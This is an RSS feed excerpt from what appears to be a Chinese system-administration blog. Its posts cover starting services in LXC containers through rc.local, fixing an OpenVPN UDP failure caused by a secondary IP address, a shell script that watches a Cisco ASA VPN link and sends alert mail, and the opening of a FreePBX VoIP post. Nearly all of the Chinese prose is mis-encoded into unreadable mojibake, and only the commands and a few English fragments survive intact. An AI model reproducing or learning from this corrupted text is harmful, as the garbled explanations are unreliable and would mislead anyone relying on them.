&lt;p&gt;å®¹å™¨å†…æˆ‘ä»¬æ˜¯é‡‡ç”¨supervisordä¸»è¿›ç¨‹æ¥ä¿æŒå®¹å™¨ä¸è‡ªåŠ¨é”€æ¯çš„ï¼Œé‚£ä¹ˆå…¶ä»–å‘½ä»¤å¦‚æœéƒ½åŠ å…¥supervisordï¼Œé‚£ä¼šéå¸¸éº»çƒ¦ã€‚&lt;/p&gt;
&lt;p&gt;ç®€å•åŒ–ï¼Œç”¨lxc-executeæ¥æ‰§è¡Œï¼Œæ¯”è¾ƒéº»çƒ¦çš„å°±æ˜¯éœ€è¦æŸ¥å‡ºæ¥lxcå®¹å™¨çš„åå­—ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥å‡ºjko2o-16-13-49çš„å…¨åï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker inspect -f &lt;span class=&#34;s1&#34;&gt;&amp;#39;{{.Id}}&amp;#39;&lt;/span&gt; jko2o-16-13-49  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åç¼–è¾‘/etc/rc.d/rc.localï¼Œç”¨lxc-executeæ‰§è¡Œå‘½ä»¤å°±å¯ä»¥äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#47&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service mysqld start  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service httpd start  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#48&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/mysqld start  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/httpd start  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/wdapache start  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/nginxd start  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/pureftpd start  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#49&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lxc-execute -n ebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f -- /export/servers/nginx178/sbin/nginx  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#50&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lxc-execute -n 5b7e8cd3130d31bae5b089202c7e2092b9daca5f19cc055ce4ee50cf8b789504 -- /export/servers/tomcat/tomcat.sh  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4&gt;&lt;/h4&gt;</description>
    </item>
    <item>
      <title>OpenvpnæœåŠ¡å™¨ç«¯æ— æ³•å¼€é€šudpç«¯å£çš„æ•…éšœæ’é™¤</title>
      <link>https://rendoumi.com/posts/20240108-opnevpn_udp_port/</link>
      <pubDate>Mon, 08 Jan 2024 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240108-opnevpn_udp_port/</guid>
      <description>&lt;h5 id=&#34;openvpn-server-cant-use-udp-port&#34;&gt;openvpn server can&amp;rsquo;t use udp port&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé—®é¢˜éå¸¸å¤æ€ªï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæœºæˆ¿ã€‚åˆ†åˆ«åœ¨ä¸¤è¾¹å‡è®¾äº†openvpnæœåŠ¡å™¨ï¼Œä¸€ä¸ªæœºæˆ¿çš„ovpnå°±å®Œå…¨æ­£å¸¸ï¼Œè€Œå¦ä¸€ä¸ªæœºæˆ¿çš„openvpnå¦‚æœæ˜¯tcpå°±æ²¡é—®é¢˜ï¼Œå¦‚æœæ˜¯udpå°±æŠ¥é”™ï¼Œæ— æ³•è¿æ¥ã€‚æŠŠæ­£å¸¸æœºæˆ¿çš„openvpnå®Œå…¨å¤åˆ¶ä¸€ä»½æ‹¿è¿‡å»ï¼Œä¹Ÿæ˜¯ä¸€æ ·æŠ¥é”™ï¼Œå¤ªéƒé—·äº†ï¼&lt;/p&gt;
&lt;p&gt;é”™è¯¯æç¤ºæ˜¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TLS Error: TLS key negotiation failed to occur within &lt;span class=&#34;m&#34;&gt;60&lt;/span&gt; seconds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;check your network connectivity&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;éå¸¸å¤æ€ªå•Šï¼š åœ¨å†…ç½‘ç”¨ncæ¥è¯•éªŒudpæ˜¯å¦æ­£å¸¸ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -ul &lt;span class=&#34;m&#34;&gt;1194&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨å†…ç½‘éšä¾¿æ‰¾ä¸€å°æœºå™¨æµ‹è¯•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -u xxxx &lt;span class=&#34;m&#34;&gt;1194&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åä¸¤è¾¹éšä¾¿è¾“å…¥å­—ç¬¦æµ‹è¯•ï¼Œæ²¡é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åä»å…¬ç½‘æµ‹è¯•ï¼Œå°±å‡ºé—®é¢˜äº†ã€‚ncè¿æ¥ä¸Šä»¥åï¼Œåªèƒ½å‘é€ä¸€æ¬¡æ•°æ®ï¼Œç„¶åç®¡é“å°±æ–­è£‚äº†ï¼Œæ— æ³•å†ä¼ æ•°æ®ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -u å…¬ç½‘ip &lt;span class=&#34;m&#34;&gt;1194&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aaa  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc: Write error: Connection refused  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç™¾æ€ä¸å¾—å…¶è§£å•Šï¼Œè¯•äº†è‹¥å¹²æ¬¡ï¼Œæ‰å‘ç°é—®é¢˜çš„ç—‡ç»“æ‰€åœ¨ã€‚&lt;/p&gt;
&lt;p&gt;é”™è¯¯çš„é‚£å°æœåŠ¡å™¨ï¼Œæœ‰ä¸¤ä¸ªç½‘ç»œåœ°å€ï¼š 172.16.8.4å’Œ172.16.8.1
å…¶ä¸­8.4çš„åœ°å€æ˜¯ç¼ºçœåœ°å€ï¼Œ8.1çš„åœ°å€æ˜¯ç”¨ifconfigæ‰‹åŠ¨åæ·»åŠ çš„ã€‚ è€Œå‰ç«¯é˜²ç«å¢™åšå¾—å…¬ç½‘æ˜ å°„æ˜¯æ˜ å°„åˆ°äº†8.1çš„1194ç«¯å£&lt;/p&gt;
&lt;p&gt;tcpç”±äºåŒæ–¹æ˜¯è¦æ ¡éªŒæ¥å¾€srcåœ°å€çš„ï¼Œæ‰€ä»¥æ²¡é—®é¢˜ï¼Œåˆ°äº†udpï¼Œåªç®¡å‘ä¸ç®¡æ”¶ï¼Œæ‰€ä»¥udpåŒ…å°±ä»8.4çš„ç¼ºçœåœ°å€å‘å‡ºå»ï¼Œå¯¼è‡´åŒæ–¹ä¸ä¸€è‡´ï¼Œæ— æ³•æ­£å¸¸æ¥æ”¶äº†ã€‚&lt;/p&gt;
&lt;p&gt;è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåœ¨openvpnæœåŠ¡å™¨ç«¯çš„é…ç½®æ–‡ä»¶ä¸­å¼ºè¡ŒæŒ‡å®šlocalç«¯çš„ipå³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; 172.16.8.1  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Cisco ASA5520 VPNçº¿è·¯çš„ç›‘æ§å’Œè‡ªåŠ¨é‡å¯</title>
      <link>https://rendoumi.com/posts/20240107-vpn_monitor/</link>
      <pubDate>Mon, 08 Jan 2024 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240107-vpn_monitor/</guid>
      <description>&lt;h5 id=&#34;cisco-asa5520-vpnçº¿è·¯çš„ç›‘æ§å’Œé‡å¯&#34;&gt;Cisco ASA5520 VPNçº¿è·¯çš„ç›‘æ§å’Œé‡å¯&lt;/h5&gt;
&lt;p&gt;å…¬å¸ä»äº‹ç¬¬ä¸‰æ–¹æ”¯ä»˜å·¥ä½œï¼Œè·Ÿå¾ˆå¤šé“¶è¡Œéƒ½æœ‰åˆä½œå…³ç³»ï¼Œæ‹‰äº†å¾ˆå¤šä¸“çº¿ç›´é€šé“¶è¡Œï¼ŒåŒæ–¹å»ºç«‹VPNï¼Œä¸¤ç«¯éƒ½æ˜¯Ciscoçš„è®¾å¤‡ï¼Œä½†æ˜¯ï¼Œè¿™äº›çº¿è·¯æœ‰æ—¶å€™ä¼šè«åå…¶å¦™çš„æ–­æ‰ï¼Œå…³é”®æ˜¯ç¨‹åºä¸çŸ¥é“å•Šï¼Œè€æ˜¯é‡è¿ï¼Œä¸€ç›´ç­‰åˆ°å®¢æœåæ˜ å®¢æˆ·æŠ•è¯‰ï¼ŒæŸ¥ä¸€åœˆç¨‹åºåæ‰çŸ¥é“ã€‚è¿™åœ¨ç”Ÿäº§ç¯å¢ƒä¸Šå¯æ˜¯è¡Œä¸é€šçš„ï¼Œæ‰¾æ¥äº†æ‰€è°“Ciscoé«˜æ‰‹ï¼Œä¹Ÿæä¸æ˜ç™½ä¸ºä»€ä¹ˆè€æ–­ï¼Œæ²¡åŠæ³•ï¼Œäºæ˜¯å†™äº†ä¸¤ä¸ªç›‘æ§è„šæœ¬ï¼Œä½¿ç”¨Pingæ£€æµ‹VPNå¯¹ç«¯çš„çŠ¶å†µï¼Œä¸€æ—¦Pingä¸é€šï¼Œå°±ç”¨è„šæœ¬ç™»é™†é˜²ç«å¢™ï¼Œè‡ªåŠ¨é‡å¯VPNã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å®‰è£…ä¹‹å‰ï¼Œå…ˆå®‰è£…ä¸€ä¸ªèƒ½ä»å‘½ä»¤è¡Œå‘é€é‚®ä»¶çš„è½¯ä»¶Emailæ¥å‘é€æŠ¥è­¦é‚®ä»¶ï¼Œå¦åˆ™æ¯å°æœºå™¨éƒ½èµ·sendmailï¼Œæ²¡ä»€ä¹ˆå¿…è¦:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://github.com/muquit/mailsend-go
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å‘é€å®ä¾‹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mailsend-go -smtp smtp.126.com -port &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;auth &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -user xxx@126.com -pass xxx &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -from xxx@126.com -to  &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxx@126.com&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;-sub &lt;span class=&#34;s2&#34;&gt;&amp;#34;Test&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;body -msg &lt;span class=&#34;s1&#34;&gt;&amp;#39;hello world&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;126é‚®ç®±è¿™é‡Œçš„å¯†ç ç”¨çš„æ˜¯æˆæƒç  æˆæƒå¯†ç ï¼Œä¸æ˜¯é‚®ç®±å¯†ç 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¯´æ˜ä¸€ä¸‹åœºæ™¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;210.210.210.3æ˜¯å¯¹ç«¯Cisco vpnè®¾å¤‡çš„å…¬ç½‘IP&lt;/li&gt;
&lt;li&gt;192.168.101.99æ˜¯å»ºç«‹äº†VPNåï¼Œå¯¹ç«¯æœåŠ¡å™¨çš„ç§ç½‘IPåœ°å€ï¼›&lt;/li&gt;
&lt;li&gt;192.168.1.1æ˜¯å·±æ–¹Cisco ASA5520çš„ç§ç½‘åœ°å€ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt; -eq &lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;live&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;ping -c4 &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.101.99&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;wc -l&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$live&lt;/span&gt; -eq &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /usr/local/bin/mailsend-go -debug -to &lt;span class=&#34;s2&#34;&gt;&amp;#34;ranrui.zhang@rendoumi.com&amp;#34;&lt;/span&gt; -from monit@ddky.com -ssl -port &lt;span class=&#34;m&#34;&gt;465&lt;/span&gt; -smtp smtp.qiye.aliyun.com &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;             auth -user &lt;span class=&#34;s2&#34;&gt;&amp;#34;monit@ddky.com&amp;#34;&lt;/span&gt; -pass &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;             -sub &lt;span class=&#34;s2&#34;&gt;&amp;#34;vpnæ–­äº†&amp;#34;&lt;/span&gt; body -msg &lt;span class=&#34;s2&#34;&gt;&amp;#34;`date +%Y`å¹´`date +%m`æœˆ`date +%d`æ—¥ vpnæ–­äº†ï¼ï¼ï¼&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;             -cs &lt;span class=&#34;s2&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /usr/local/bin/revpn.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;`date +%Y`å¹´`date +%m`æœˆ`date +%d`æ—¥ `date +%H`ç‚¹`date +%M`åˆ†
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                çº¿è·¯ä¸èƒ½åˆ°è¾¾ç‹åºœäº•æœºæˆ¿ï¼Œé‡å¯VPNã€‚&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        sleep &lt;span class=&#34;m&#34;&gt;60&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    sleep &lt;span class=&#34;m&#34;&gt;60&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»¥ä¸‹æ˜¯ç”¨expectè‡ªåŠ¨ç™»å½•Ciscoè·¯ç”±å™¨é‡å¯vpnçš„è„šæœ¬ revpn.sh&lt;/p&gt;</description>
    </item>
    <item>
      <title>æœ€æ–°ç‰ˆå‡ºå›½æ—…è¡Œå®‰è£…ä¸€ä¸ªFreePBXçš„voipç”µè¯è‡ªç”¨</title>
      <link>https://rendoumi.com/posts/20240105-voip_iphone/</link>
      <pubDate>Fri, 05 Jan 2024 09:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240105-voip_iphone/</guid>
      <description>&lt;p&gt;æ–°çš„ä¸€å¹´ä¾å§‹ï¼Œå¼€å§‹å®šå¥½äº†æ—…è¡Œè®¡åˆ’ï¼Œä½†æ˜¯æœ‰ä¸ªä¸œè¥¿å´ä¾ç„¶å¿ƒç¥ä¸å®ã€‚&lt;/p&gt;
&lt;p&gt;é‚£å°±æ˜¯ä¸‡ä¸€åœ¨å›½å¤–æœ‰ä»€ä¹ˆå˜åŠ¨ï¼Œå¦‚ä½•å¾€å›½å†…æ‰“ç”µè¯å‘¢ï¼Ÿï¼&lt;/p&gt;
&lt;p&gt;è¯´åˆ°è¿™é‡Œï¼Œä¸å¾—ä¸æä¸ªä¸œè¥¿ï¼Œé‚£å°±æ˜¯æ—…é¡ºçš„Appï¼Œè¿™ä¸ªä¸œè¥¿å·²ç»æ¶ˆå¤±äº†ï¼Œä½†æ˜¯ç»å¯¹å€¼å¾—è¢«è®°ä½å•Šã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªä¸œè¥¿åœ¨å¡ç­å²›æ—…æ¸¸çš„æ—¶å€™æ›¾ç»æ•‘äº†è‡ªå·±ä¸¤æ¬¡&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ˜¯å®ƒçš„ç¬¬ä¸€ä»£äº§å“ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240105135104823&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240105-voip_iphone/image-20240105135104823.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€ä»£çš„åŸç†ä¼¼ä¹æ˜¯æŠŠæ‰‹æœºçš„ä¿¡å·ç›´æ¥é€šè¿‡ç½‘ç»œè½¬ç§»åˆ°äº†å›½å†…ï¼Œéšèº«æºå¸¦ç„¶åé…åˆappä½¿ç”¨ï¼Œè¿™ç‚¹éå¸¸ç‰›å§ï¼å›½å†…çš„çªœå‡ºç‚¹ä¼šéšæœºï¼Œå¿½è€Œå¤©æ´¥ï¼Œå¿½è€Œåˆ«çš„åœ°æ–¹ï¼Œæ‰€ä»¥å‘¼å‡ºç”µè¯æä¸å¥½æ˜¯é•¿é€”è®¡è´¹ã€‚ç¬¬ä¸€æ¬¡å‘¢å…«æˆ’æ˜¯åœ¨å¡ç­å²›ä¸­éƒ¨é‚£ä¸ªéº¦å½“åŠ³é™„è¿‘ï¼Œç”¨è¿™ä¸ªæ¥åˆ°äº†å›½å†…çš„ç”µè¯ï¼Œè¯´æ˜¯å‡ºå¤§äº‹äº†ï¼Œæœ‰äººæŠŠå…¬å¸æ•°æ®åº“çš„æ•°æ®ç»™æ”¹äº†ï¼Œå½“æ—¶çº¦å®šä¸‹åˆ6ï¼š00å†æ‰“ï¼Œç„¶åä¸‹åˆåœ¨å°æ¹¾ç‰›è‚‰é¢çš„åº—é‡Œï¼Œåˆç”¨è¿™ä¸ªå¾€å›½å†…é€šäº†ç”µè¯ï¼Œæ‰“äº†åŠä¸ªå¤šå°æ—¶ï¼Œé¢†å¯¼å‘ŠçŸ¥äº†å…·ä½“çš„æƒ…å†µï¼Œè¦æ˜¯æ¥ä¸èµ·æ¥é‚£å¯çœŸå°±éº»çƒ¦å¤§äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ˜¯å®ƒç¬¬äºŒä»£çš„äº§å“ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240105135031364&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240105-voip_iphone/image-20240105135031364.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ˜¯å‡çº§ç‰ˆproï¼Œå°±æ›´å‰å®³äº†ï¼Œç›´æ¥æ”¾å®¶é‡Œï¼Œæ‰‹æœºä¸Šä¸‹ä¸ªappï¼Œæœ‰ç½‘ç»œå°±èƒ½ç”¨äº†ï¼Œä¸ç”¨åƒç¬¬ä¸€ä»£ä¸€æ ·éšèº«æºå¸¦äº†ã€‚&lt;/p&gt;
